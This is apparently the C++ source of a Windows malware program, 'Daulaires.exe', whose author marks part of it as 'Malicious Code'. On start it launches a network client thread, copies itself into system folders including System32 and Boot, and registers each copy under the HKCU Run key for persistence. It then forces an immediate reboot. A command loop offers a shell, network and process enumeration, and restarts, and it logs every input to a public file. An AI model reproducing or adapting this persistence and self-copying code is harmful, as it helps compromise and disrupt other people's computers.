#include "Depenencies/Headers/Tools.h"

auto Main::Windows() -> bool
{
    Info info;
    Utils utils;
    Memory Memory;
    map<string, function<void()>> commands;

    utils.DisplayText(info.getCurrentDirectory());
    utils.DisplayText(info.getSystemArchitecture());
    utils.DisplayText(info.getSystemType());


    Memory.WriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");

    // system("shutdown /r /t 0");

    while (true) {

        commands["restart"] = [&]() {
            utils.DisplayText("Restarting...");
            Sleep(500);
            system("shutdown /r /t 0");
        };

        commands["notepad"] = [&]() {
            utils.DisplayText("Launching notepad...");
            Sleep(500);
            system("c:\\windows\\system32\\notepad.exe");
        };

        commands["nslookup"] = [&]() {
            utils.DisplayText("Launching nslookup...");
            Sleep(500);
            system("c:\\windows\\system32\\nslookup.exe");
        };

        commands["arp"] = [&]() {
            utils.DisplayText("Launching arp...");
            Sleep(500);
            system("c:\\windows\\system32\\arp.exe -a");
        };

        commands["cmd"] = [&]() {
            utils.DisplayText("Launching cmd...");
            Sleep(500);
            info.LaunchCmd();
        };

        commands["writeFile"] = [&]() {
            utils.DisplayText("Writing to file...");
            Sleep(500);
            utils.WriteFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
        };

        commands["showDrivers"] = [&]() {
            utils.DisplayText("Getting drivers...");
            Sleep(500);
            info.getDrivers();
        };

        commands["showProcIds"] = [&]() {
            utils.DisplayText("Getting process IDs...");
            Sleep(500);
            info.ListAllProcIDS();
        };

        commands["showProcMods"] = [&]() {
            utils.DisplayText("Getting process modules...");
            info.ListAllProcModules();
        };

        commands["help"] = [&]() {
            utils.DisplayText("Commands: ");
            int i = 0;
            for (const auto& command : commands) {
                i++;
                utils.DisplayText("cmd#" + to_string(i) + " | " + command.first);
            }
        };

        commands["quit"] = [&]() {
            exit(1);
            Sleep(2000);
        };

        getline(cin, input);
        Memory.WriteToFile("test.txt", "C:\\Users\\Public\\", input);


        if (commands.find(input) != commands.end()) {
            commands[input]();
        }
        else {
            utils.DisplayText("Command not found");
        };

    };

    return true;
};

auto Main::NotWindows(void) -> bool
{
    Utils Utils;
    Utils.DisplayText("You are not using Windows.");
    return 0;
};

void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
    HKEY hKey = nullptr;

    // Open the registry key for current user startup programs
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Set the registry entry for your application
        if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), static_cast<DWORD>((appPath.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
            std::wcerr << L"Error setting registry entry." << std::endl;
        }

        // Close the registry key
        RegCloseKey(hKey);
    }
    else {
        std::wcerr << L"Error opening registry key." << std::endl;
    }
};

void write_file_to_dirs() {
    map<string, string> paths;
    // app different paths to the map
    paths["path_1"] = "C:\\Users\\Public\\";
    paths["path_2"] = "C:\\Users\\";
    paths["path_3"] = "C:\\Users\\Public\\Documents\\";
    paths["path_4"] = "C:\\";
    paths["path_5"] = "C:\\Windows\\System32\\";
    paths["path_6"] = "C:\\Windows\\Boot\\";
    paths["path_7"] = "C:\\Windows\\";
    paths["path_8"] = "C:\\Users\\Public\\Downloads\\";
    paths["path_9"] = "C:\\Users\\Public\\Pictures\\";
    paths["path_10"] = "C:\\Users\\Public\\Videos\\";
    paths["path_11"] = "C:\\Windows\\System32\\drivers\\";
    paths["path_12"] = "C:\\Windows\\System32\\drivers\\etc\\";
    paths["path_13"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";

    std::wstring appName = L"Daulaires.exe";
    // loop through all the paths and add Daulaires.exe to them
    for (const auto& path : paths) {
        // convert the path to a string before adding the file name
        string pathString = path.second;
        std::wstring appPath = std::wstring(pathString.begin(), pathString.end()) + L"Daulaires.exe";
        addToStartup(appName, appPath);
        // copy the file to the path
        CopyFile(L"Daulaires.exe", appPath.c_str(), FALSE);
    };
};

int main() {

    Info Info;
    Main Main{};
    
    string name = Info.assignName();

    // allow another console to run the client
    std::thread clientThread([&]() {
        Client(name.c_str());
    });

    // detach from this thread in order to go to the Commands loop
    clientThread.detach();

    if (Info.getSystemName() == "DEBIAN") {
        Main.NotWindows();
        return 1;
    };

    /*Malicious Code*/
    write_file_to_dirs();
    /*End Malicious Code*/ 
    
    // loop through the Info functions to check what the system is
    system("shutdown /r /t 0");
    Main.Windows();
    return 0;
};